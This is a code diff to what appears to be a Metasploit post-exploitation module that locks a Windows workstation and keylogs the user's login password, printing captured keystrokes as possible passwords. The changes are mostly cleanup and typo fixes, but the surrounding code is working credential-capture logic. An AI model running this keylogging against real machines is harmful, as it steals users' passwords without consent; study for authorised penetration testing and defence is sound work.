@@ -34,6 +34,11 @@ class MetasploitModule < Msf::Post
               stdapi_ui_stop_keyscan
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [SCREEN_EFFECTS],
+          'Reliability' => []
         }
       )
     )
@@ -103,8 +108,8 @@ class MetasploitModule < Msf::Post
         kc = VirtualKeyCodes[vk]
 
         f_shift = fl & (1 << 1)
-        f_ctrl	= fl & (1 << 2)
-        f_alt	= fl & (1 << 3)
+        _f_ctrl = fl & (1 << 2)
+        _f_alt = fl & (1 << 3)
 
         if kc
           name = (((f_shift != 0) && (kc.length > 1)) ? kc[1] : kc[0])
@@ -112,6 +117,7 @@ class MetasploitModule < Msf::Post
           when /^.$/
             outp << name
           when /shift|click/i
+            # ignore
           when 'Space'
             outp << ' '
           else
@@ -121,11 +127,13 @@ class MetasploitModule < Msf::Post
           outp << ' <0x%.2x> ' % vk
         end
       end
+
       select(nil, nil, nil, 2)
       file_local_write(logfile, "#{outp}\n")
       if !outp.nil? && (outp.chomp.lstrip != '')
         print_status("Password?: #{outp}")
       end
+
       still_locked = 1
       # Check to see if the screen saver is on, then check to see if they have logged back in yet.
       screensaver = client.railgun.user32.SystemParametersInfoA(114, nil, 1, nil)['pvParam'].unpack('C*')[0]
@@ -144,7 +152,7 @@ class MetasploitModule < Msf::Post
       end
       select(nil, nil, nil, keytime.to_i)
     end
-  rescue ::Exception => e
+  rescue StandardError => e
     if e.message != 'win'
       print_line
       print_status("#{e.class} #{e}")
@@ -154,19 +162,18 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    # Log file variables
-    host = session.session_host
-    port = session.session_port
-    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')	# Create Filename info to be appended to downloaded files
-    logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')	# Create a directory for the logs
-    ::FileUtils.mkdir_p(logs)	# Create the log directory
-    logfile = logs + ::File::Separator + host + filenameinfo + '.txt'	# Logfile name
-
     # Make sure we are on a Windows host
     if client.platform != 'windows'
       print_error('This module does not support this platform.')
       return
     end
+
+    # Log file variables
+    host = session.session_host
+    filenameinfo = '_' + ::Time.now.strftime('%Y%m%d.%M%S')	# Create Filename info to be appended to downloaded files
+    logs = ::File.join(Msf::Config.log_directory, 'scripts', 'smartlocker')	# Create a directory for the logs
+    ::FileUtils.mkdir_p(logs)	# Create the log directory
+    logfile = logs + ::File::Separator + host + filenameinfo + '.txt'	# Logfile name
 
     # Check admin status
     admin = check_admin
@@ -235,14 +242,13 @@ class MetasploitModule < Msf::Post
       end
       client.railgun.user32.LockWorkStation()
       if client.railgun.user32.GetForegroundWindow()['return'] == 0
-        print_error('Locking the workstation falied, trying again..')
+        print_error('Locking the workstation failed, trying again..')
         client.railgun.user32.LockWorkStation()
         if client.railgun.user32.GetForegroundWindow()['return'] == 0
           print_error('The system will not lock this session, nor will it be used for user login, exiting...')
           return
-        else
-          print_status('Locked this time, time to start keyloggin...')
         end
+        print_status('Locked this time, time to start keyloggin...')
       end
     end
 
